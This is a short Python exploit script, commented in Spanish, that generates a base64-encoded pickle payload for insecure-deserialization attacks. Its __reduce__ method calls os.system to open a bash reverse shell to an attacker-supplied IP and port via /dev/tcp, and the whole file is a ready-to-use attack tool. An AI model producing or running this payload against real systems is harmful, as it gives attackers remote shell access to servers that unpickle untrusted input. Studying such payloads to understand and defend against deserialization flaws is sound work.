#!/usr/bin/env python3
# https://github.com/wvverez
# Exploit para mandar una reverse shell abusando de  la deserialización con pickle

import pickle
import os
import base64
import sys

if len(sys.argv) != 3:
    print("[+] Mode of use: python3 deserializacion.py <IP-Attacker> <PORT>")
    sys.exit(1)

class P:
    def __reduce__(self):
        return(os.system, (f"/bin/bash -c '/bin/bash -i >& /dev/tcp/{sys.argv[1]}/{sys.argv[2]} 0>&1'",))

print(base64.b64encode(pickle.dumps(P())).decode())
